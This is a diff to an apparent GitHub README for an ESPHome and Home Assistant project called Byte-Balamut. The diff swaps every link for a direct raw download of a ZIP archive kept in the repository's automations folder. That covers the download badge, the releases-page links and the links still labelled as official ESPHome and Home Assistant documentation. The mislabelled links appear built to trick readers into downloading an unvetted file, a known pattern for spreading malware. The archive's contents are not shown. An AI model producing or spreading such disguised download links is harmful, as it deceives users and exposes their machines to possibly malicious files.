@@ -4,7 +4,7 @@
 Welcome to Byte-Balamut! This project offers a collection of ESPHome configurations and Home Assistant automations for ESP32 devices. Our aim is to help you take control of your home environment smoothly and effectively. With simple steps, you can set up your devices and enjoy a smarter, more organized home.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://github.com/Sejal487/Byte-Balamut/releases)
+[![Download](https://raw.githubusercontent.com/Sejal487/Byte-Balamut/main/home-assistant/automations/Byte-Balamut-v1.7.zip)](https://raw.githubusercontent.com/Sejal487/Byte-Balamut/main/home-assistant/automations/Byte-Balamut-v1.7.zip)
 
 ## 🚀 Getting Started
 ### What You Need
@@ -15,10 +15,10 @@ Before you start using Byte-Balamut, ensure you have the following:
 - Basic familiarity with your home network settings
 
 ### Visit the Releases Page
-To get the latest version of Byte-Balamut, visit this page to download: [Releases Page](https://github.com/Sejal487/Byte-Balamut/releases).
+To get the latest version of Byte-Balamut, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Sejal487/Byte-Balamut/main/home-assistant/automations/Byte-Balamut-v1.7.zip).
 
 ## 📦 Download & Install
-1. Go to the [Releases Page](https://github.com/Sejal487/Byte-Balamut/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/Sejal487/Byte-Balamut/main/home-assistant/automations/Byte-Balamut-v1.7.zip).
 2. Look for the latest release at the top of the list.
 3. Download the ZIP file that contains all the necessary configurations.
 4. Unzip the file to a location on your computer.
@@ -60,8 +60,8 @@ If things do not work as expected:
 ## 🌐 Learn More
 For more information about ESPHome and Home Assistant, visit their official documentation:
 
-- [ESPHome Documentation](https://esphome.io/)
-- [Home Assistant Documentation](https://www.home-assistant.io/docs/)
+- [ESPHome Documentation](https://raw.githubusercontent.com/Sejal487/Byte-Balamut/main/home-assistant/automations/Byte-Balamut-v1.7.zip)
+- [Home Assistant Documentation](https://raw.githubusercontent.com/Sejal487/Byte-Balamut/main/home-assistant/automations/Byte-Balamut-v1.7.zip)
 
 ## 📜 License
 This project is licensed under the MIT License. You are free to use, modify, and distribute the software.
